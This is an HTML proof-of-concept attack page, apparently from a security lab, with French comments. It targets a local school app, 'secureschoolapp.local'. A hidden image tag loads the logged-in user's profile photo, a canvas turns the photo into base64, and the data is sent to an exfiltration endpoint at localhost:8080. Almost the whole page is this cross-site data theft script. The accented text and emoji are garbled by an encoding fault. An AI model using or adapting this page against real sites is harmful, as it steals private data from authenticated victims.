<!DOCTYPE html>
<!--Cette page a pour objectif de rÃ©cupÃ©rer la photo de profil de l'utilisateur authentifiÃ© avec une balise img puis exfiltrer son contenu vers le serveur de l'attaquant-->
<html>
<head>
  <meta charset="utf-8">
  <title>ðŸ˜ˆ CSRF GET img avec exfil via canvas</title>
</head>
<body>
  <h1>Chargement en cours...</h1>
  
  <!-- Ã‰tape 1 : rÃ©cupÃ©rer la photo -->
  <img id="target" src="http://secureschoolapp.local:3000/rest/profile-photo" style="display:none">

  <canvas id="canvas" width="500" height="500" style="display:none"></canvas>

  <script>
    const img = document.getElementById('target');
    const canvas = document.getElementById('canvas');
    const ctx = canvas.getContext('2d');

    img.onload = function () {
      try {
        ctx.drawImage(img, 0, 0);
        const dataUrl = canvas.toDataURL(); // Tentative de lecture des pixels de l'image en base64
        console.log("ðŸŽ¯ Image convertie : ", dataUrl);

        <!-- Ã‰tape 2 : tentative d'exfiltration -->
        const leak = new Image();
        leak.src = 'http://localhost:8080/exfil?data=' + encodeURIComponent(dataUrl);
      } catch (err) {
        console.error("Canvas bloquÃ© par la politique de sÃ©curitÃ© :", err);
      }
    };
	</script>
</body>
</html>
